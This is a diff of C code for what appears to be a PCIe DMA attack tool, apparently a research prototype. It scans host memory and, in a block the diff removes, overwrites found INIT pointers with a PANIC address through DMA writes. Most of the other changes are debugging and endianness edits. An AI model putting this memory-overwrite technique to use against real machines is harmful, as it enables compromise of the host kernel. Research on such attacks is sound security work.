@@ -119,15 +119,22 @@ respond_to_packet(struct packet_response_state *state,
 
 	requester_id = request_dword1->requester_id;
 
-	switch (dword0->type) {
+	printf("header addr: %p\n", in->header);
+	printf("dword0: 0x%08"PRIx32" (%d).\n", *(uint32_t *)dword0, sizeof(dword0));
+	printf("dword1: 0x%08"PRIx32" (%d).\n",
+		*(uint32_t *)request_dword1, sizeof(request_dword1));
+	printf("dword2: 0x%08"PRIx32" (%d).\n",
+		*(uint32_t *)config_request_dword2, sizeof(config_request_dword2));
+
+	switch (get_type(dword0)) {
 	case CFG_0:
 		if ((config_request_dword2->device_id & uint32_mask(3)) != 0) {
-			printf("Don't like device_id: %x.\n",
+			printf("ENDIAND ISSUES AHEAD! Don't like device_id: %x.\n",
 				config_request_dword2->device_id);
-			break;
 		}
 
 		state->devfn = config_request_dword2->device_id;
+
 		response = PR_RESPONSE;
 		req_addr = get_config_req_addr(in);
 
@@ -143,7 +150,7 @@ respond_to_packet(struct packet_response_state *state,
 			default:
 				out->data[0] = 0;
 			}
-			out->data[0] = bswap32(out->data[0]);
+			out->data[0] = le32_to_cpu(out->data[0]);
 		} else {
 			out->data_length = 0;
 		}
@@ -163,8 +170,8 @@ respond_to_packet(struct packet_response_state *state,
 		}
 		break;
 	default:
-		printf("Ignoring %s (0x%x) TLP.\n", tlp_type_str(dword0->type),
-			dword0->type);
+		printf("Ignoring %s (0x%x) TLP.\n", tlp_type_str(get_type(dword0)),
+			get_type(dword0));
 		/*puts("Ignoring a TLP :(");*/
 		break;
 	}
@@ -205,7 +212,7 @@ main(int argc, char *argv[])
 	packet_response_state.attack_state = AS_UNINITIALISED;
 	uint64_t read_addr;/* next_read_addr = 0x000000; */
 	/*uint64_t next_read_addr = 0x3b0000000;*/
-	/*uint64_t next_read_addr = 0x000000;*/
+	/*uint64_t0xC0040000LL next_read_addr = 0x000000;*/
 	uint64_t scan_region_base =  0x2000000;
 	uint64_t scan_region_limit = 0x3000000;
 	uint64_t next_read_addr = scan_region_base;
@@ -234,15 +241,20 @@ main(int argc, char *argv[])
 		return init;
 	}
 
-	drain_pcie_core();
-	puts("PCIe Core Drained. Let's go.");
+	/*
+	 * XXX TODO this is setting stdout unbuffered
+	 */
+	setvbuf(stdout, NULL, _IONBF, 0);
 
-	uint64_t panic_addr_host_endian = bswap64(PANIC);
+	drain_pcie_core();
+	puts("PCIe Core Drained. Let's go OK.");
 
 	while (1) {
 		next_tlp(&raw_tlp_in);
 
 		if (is_raw_tlp_valid(&raw_tlp_in)) {
+			printf("header addr: %p, (%llx)\n",
+				raw_tlp_in.header, *raw_tlp_in.header);
 			response = respond_to_packet(&packet_response_state,
 				&raw_tlp_in, &raw_tlp_out);
 			if (response != PR_NO_RESPONSE) {
@@ -292,16 +304,6 @@ main(int argc, char *argv[])
 						/*read_addr + i * sizeof(uint64_t),*/
 						/*candidate_symbols[i]);*/
 				/*}*/
-				if (candidate_symbols[i] == INIT) {
-					perform_dma_write(
-						(uint8_t *)&panic_addr_host_endian,
-						sizeof(panic_addr_host_endian),
-						packet_response_state.devfn,
-						0,
-						next_read_addr + i * sizeof(uint64_t));
-					putchar('X');
-					fflush(stdout);
-				}
 			}
 			break;
 		}
